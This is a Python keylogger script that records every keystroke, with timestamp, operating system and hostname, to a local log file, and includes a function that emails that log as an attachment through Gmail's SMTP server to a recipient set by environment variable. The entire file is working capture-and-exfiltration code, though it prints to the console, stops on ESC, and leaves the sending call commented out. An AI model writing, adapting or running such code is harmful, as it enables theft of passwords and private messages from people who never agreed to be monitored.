# libraries 
from pynput import keyboard
from datetime import datetime
import os
import platform
import socket
import threading 
# file sending libraries
import smtplib                        # Handles SMTP email connection
from email.mime.multipart import MIMEMultipart  # Creates email with multiple parts
from email.mime.base import MIMEBase            # Creates attachment part
from email.mime.text import MIMEText            # Creates text part
from email import encoders                      # Encodes attachment to base64


#---------------------- Config /files----------------------------------#
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_DIR = os.path.join(SCRIPT_DIR, "logs")  # directory for logs
LOG_FILE = os.path.join(LOG_DIR, "keylog.txt") #log file path 
os.makedirs(LOG_DIR, exist_ok=True)

#---------------------- Email Config ----------------------------------#
e_sender = os.getenv("email_sender")  # Sender's email from environment variable
e_receiver = os.getenv("email_receiver")  # Receiver's email from environment variable
e_file = LOG_FILE

# Global variables for stopping
stop_flag = threading.Event()
listener = None

# Function to stop the keylogger
def stop_keylogger():
    stop_flag.set()
    if listener:
        listener.stop()
    print("\n[*] Keylogger stopped.")

# Function to start capturing keystrokes
def start_keylogger():
    global listener
    def on_press(key):
        if stop_flag.is_set():
            return False  # Stop the listener
        with open(LOG_FILE, "a") as f:
            platform_info = platform.system()
            hostname = socket.gethostname()

            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            print(f"[{timestamp}] {key} pressed on {platform_info} ({hostname})")  # Console output
            
            try:
                f.write(f"[{timestamp}] {key.char}\n")
            except AttributeError:
                # Format special keys nicely
                special_keys = {
                    "Key.space":     "[SPACE]",
                    "Key.enter":     "[ENTER]",
                    "Key.backspace": "[BACKSPACE]",
                    "Key.tab":       "[TAB]",
                    "Key.shift":     "[SHIFT]",
                    "Key.shift_r":   "[SHIFT]",
                    "Key.ctrl_l":    "[CTRL]",
                    "Key.ctrl_r":    "[CTRL]",
                    "Key.alt_l":     "[ALT]",
                    "Key.alt_r":     "[ALT]",
                    "Key.caps_lock": "[CAPS LOCK]",
                    "Key.delete":    "[DELETE]",
                    "Key.esc":       "[ESC]",
                    "Key.up":        "[UP]",
                    "Key.down":      "[DOWN]",
                    "Key.left":      "[LEFT]",
                    "Key.right":     "[RIGHT]",
                    "Key.home":      "[HOME]",
                    "Key.end":       "[END]",
                    "Key.page_up":   "[PAGE UP]",
                    "Key.page_down": "[PAGE DOWN]",
                }

                key_str = str(key)
                label = special_keys.get(key_str, f"[{key_str.upper()}]")
                f.write(f"[{timestamp}] {label}\n")

    def on_release(key):
        if key == keyboard.Key.esc:
            stop_keylogger()  # Stop on ESC
            return False

    print("Keylogger started. Press ESC to stop or call stop_keylogger().")
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    listener.join()

# To activate, call start_keylogger()
if __name__ == "__main__":
    start_keylogger()

# to send the keylog file. 
def send_keylog():
    # create email 
    msg = MIMEMultipart()
    msg['From'] = e_sender
    msg['To'] = e_receiver
    msg['Subject'] = "Keylog File"

    # attach the file
    with open(e_file, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    encoders.encode_base64(part)
    part.add_header("Content-Disposition", f"attachment; filename= {os.path.basename(e_file)}")
    msg.attach(part)

    # ------ --- --- --- email sending - ----- -- - - - -------#
    try:
        with smtplib.SMTP(host="smtp.gmail.com", port=587) as server:
            server.starttls()
            server.login(e_sender, password = os.getenv("password")) 
            server.send_message(msg)
        print("[*] Keylog file sent successfully.")
    except Exception as e:
        print(f"[*] Failed to send keylog file: {e}")

# Example usage: call send_keylog() when you want to send the log file
# send_keylog()
    


